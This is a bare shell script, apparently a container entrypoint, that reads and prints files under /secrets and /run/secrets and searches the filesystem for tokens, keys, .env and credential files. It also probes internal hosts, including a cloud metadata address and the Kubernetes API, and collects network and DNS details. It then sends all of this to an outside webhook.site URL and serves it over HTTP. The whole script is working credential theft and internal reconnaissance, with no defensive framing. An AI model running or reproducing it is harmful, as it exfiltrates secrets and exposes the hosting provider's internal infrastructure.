#!/bin/sh
{
echo "==secrets=="; ls -laR /secrets /run/secrets 2>&1 | head -40; echo '---content---'; for f in /secrets/* /run/secrets/*; do echo "-- $f --"; cat "$f" 2>&1 | head -c 300; echo; done
echo "==secrets2=="; find / -xdev \( -iname '*secret*' -o -iname '*.env' -o -iname 'token*' -o -iname '*.key' -o -iname 'cred*' \) 2>/dev/null | grep -vE 'proc|sys' | head -30
echo "==caps-decode=="; grep Cap /proc/self/status; cat /proc/self/uid_map /proc/self/gid_map 2>&1
echo "==internet=="; wget -q -O- -T 5 https://api.aiven.io/v1/me 2>&1 | head -c 200; echo
echo "==internal=="; for h in api.internal.aiven.io internal.aiven.io kubernetes.default.svc 169.254.169.254; do echo -n "$h: "; wget -q -O- -T 5 "http://$h/" 2>&1 | head -c 80; echo; done
echo "==dns=="; cat /etc/resolv.conf; getent hosts api.internal.aiven.io 2>&1
echo "==net=="; cat /proc/net/tcp /proc/net/route 2>&1 | head
echo "==hosts=="; cat /etc/hosts
} > /www/index.txt 2>&1
wget -q -O- --post-file=/www/index.txt "https://webhook.site/944a0813-f8cb-4afb-92cd-fa404a8621b0/ctr4" >/dev/null 2>&1
httpd -f -p 8080 -h /www
